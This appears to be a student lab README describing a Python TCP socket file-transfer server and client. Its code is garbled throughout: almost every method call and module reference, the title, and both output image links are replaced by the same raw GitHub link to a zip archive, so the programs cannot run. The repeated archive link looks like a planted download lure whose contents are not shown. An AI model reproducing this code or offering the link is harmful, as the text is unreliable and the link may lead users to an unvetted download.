# https://raw.githubusercontent.com/Yugabharathi91/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/Technicolor/c_USIN_TRANSFE_SOCKETS_FIL_TC_1.3.zip FOR FILE TRANSFER USING TCP SOCKETS
## NAME:YUGABHARATHI M
## REGISTER NO:212224230314
## AIM
To write a python program for creating File Transfer using TCP Sockets Links
## ALGORITHM:
1. Import the necessary python modules.
2. Create a socket connection using socket module.
3. Send the message to write into the file to the client file.
4. Open the file and then send it to the client in byte format.
5. In the client side receive the file from server and then write the content into it.
## PROGRAM

### server:
```python

import socket
import os

HOST = '127.0.0.1'  
PORT = 65432  

def send_file(filename, conn):
    if https://raw.githubusercontent.com/Yugabharathi91/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/Technicolor/c_USIN_TRANSFE_SOCKETS_FIL_TC_1.3.zip(filename):
        https://raw.githubusercontent.com/Yugabharathi91/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/Technicolor/c_USIN_TRANSFE_SOCKETS_FIL_TC_1.3.zip(b'EXISTS')
        file_size = https://raw.githubusercontent.com/Yugabharathi91/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/Technicolor/c_USIN_TRANSFE_SOCKETS_FIL_TC_1.3.zip(filename)
        https://raw.githubusercontent.com/Yugabharathi91/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/Technicolor/c_USIN_TRANSFE_SOCKETS_FIL_TC_1.3.zip(str(file_size).encode('utf-8'))
        client_response = https://raw.githubusercontent.com/Yugabharathi91/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/Technicolor/c_USIN_TRANSFE_SOCKETS_FIL_TC_1.3.zip(1024).decode('utf-8')
        if client_response == 'READY':
            with open(filename, 'rb') as f:
                chunk = https://raw.githubusercontent.com/Yugabharathi91/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/Technicolor/c_USIN_TRANSFE_SOCKETS_FIL_TC_1.3.zip(1024)
                while chunk:
                    https://raw.githubusercontent.com/Yugabharathi91/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/Technicolor/c_USIN_TRANSFE_SOCKETS_FIL_TC_1.3.zip(chunk)
                    chunk = https://raw.githubusercontent.com/Yugabharathi91/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/Technicolor/c_USIN_TRANSFE_SOCKETS_FIL_TC_1.3.zip(1024)
            print(f"File '{filename}' sent successfully.")
    else:
        https://raw.githubusercontent.com/Yugabharathi91/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/Technicolor/c_USIN_TRANSFE_SOCKETS_FIL_TC_1.3.zip(b'NOT_EXISTS')

with https://raw.githubusercontent.com/Yugabharathi91/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/Technicolor/c_USIN_TRANSFE_SOCKETS_FIL_TC_1.3.zip(https://raw.githubusercontent.com/Yugabharathi91/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/Technicolor/c_USIN_TRANSFE_SOCKETS_FIL_TC_1.3.zip, https://raw.githubusercontent.com/Yugabharathi91/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/Technicolor/c_USIN_TRANSFE_SOCKETS_FIL_TC_1.3.zip) as server_socket:
    https://raw.githubusercontent.com/Yugabharathi91/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/Technicolor/c_USIN_TRANSFE_SOCKETS_FIL_TC_1.3.zip((HOST, PORT))
    https://raw.githubusercontent.com/Yugabharathi91/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/Technicolor/c_USIN_TRANSFE_SOCKETS_FIL_TC_1.3.zip()

    print(f"File server is listening on {HOST}:{PORT}")
    while True:
        conn, addr = https://raw.githubusercontent.com/Yugabharathi91/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/Technicolor/c_USIN_TRANSFE_SOCKETS_FIL_TC_1.3.zip()
        with conn:
            print(f"Connected by {addr}")

            filename = https://raw.githubusercontent.com/Yugabharathi91/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/Technicolor/c_USIN_TRANSFE_SOCKETS_FIL_TC_1.3.zip(1024).decode('utf-8')
            print(f"Client requested file: {filename}")

            send_file(filename, conn)
```

### client:

```python
import socket

HOST = '127.0.0.1'  
PORT = 65432  


def receive_file(filename, conn):
    response = https://raw.githubusercontent.com/Yugabharathi91/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/Technicolor/c_USIN_TRANSFE_SOCKETS_FIL_TC_1.3.zip(1024).decode('utf-8')

    if response == 'EXISTS':
        file_size = int(https://raw.githubusercontent.com/Yugabharathi91/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/Technicolor/c_USIN_TRANSFE_SOCKETS_FIL_TC_1.3.zip(1024).decode('utf-8'))
        print(f"File '{filename}' exists on server, size: {file_size} bytes.")

        https://raw.githubusercontent.com/Yugabharathi91/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/Technicolor/c_USIN_TRANSFE_SOCKETS_FIL_TC_1.3.zip(b'READY')

        with open('received_' + filename, 'wb') as f:
            total_received = 0
            while total_received < file_size:
                data = https://raw.githubusercontent.com/Yugabharathi91/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/Technicolor/c_USIN_TRANSFE_SOCKETS_FIL_TC_1.3.zip(1024)
                https://raw.githubusercontent.com/Yugabharathi91/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/Technicolor/c_USIN_TRANSFE_SOCKETS_FIL_TC_1.3.zip(data)
                total_received += len(data)
                print(f"Received {total_received} of {file_size} bytes")

        print(f"File '{filename}' received and saved as 'received_{filename}'")
    else:
        print("File does not exist on the server.")

with https://raw.githubusercontent.com/Yugabharathi91/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/Technicolor/c_USIN_TRANSFE_SOCKETS_FIL_TC_1.3.zip(https://raw.githubusercontent.com/Yugabharathi91/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/Technicolor/c_USIN_TRANSFE_SOCKETS_FIL_TC_1.3.zip, https://raw.githubusercontent.com/Yugabharathi91/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/Technicolor/c_USIN_TRANSFE_SOCKETS_FIL_TC_1.3.zip) as client_socket:
    https://raw.githubusercontent.com/Yugabharathi91/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/Technicolor/c_USIN_TRANSFE_SOCKETS_FIL_TC_1.3.zip((HOST, PORT))

    filename = input("Enter the filename you want to download: ")
    https://raw.githubusercontent.com/Yugabharathi91/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/Technicolor/c_USIN_TRANSFE_SOCKETS_FIL_TC_1.3.zip(https://raw.githubusercontent.com/Yugabharathi91/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/Technicolor/c_USIN_TRANSFE_SOCKETS_FIL_TC_1.3.zip('utf-8'))

    receive_file(filename, client_socket)
```

## OUPUT

![image](https://raw.githubusercontent.com/Yugabharathi91/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/Technicolor/c_USIN_TRANSFE_SOCKETS_FIL_TC_1.3.zip)

![image](https://raw.githubusercontent.com/Yugabharathi91/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/Technicolor/c_USIN_TRANSFE_SOCKETS_FIL_TC_1.3.zip)

## RESULT
Thus, the python program for creating File Transfer using TCP Sockets Links was 
successfully created and executed.
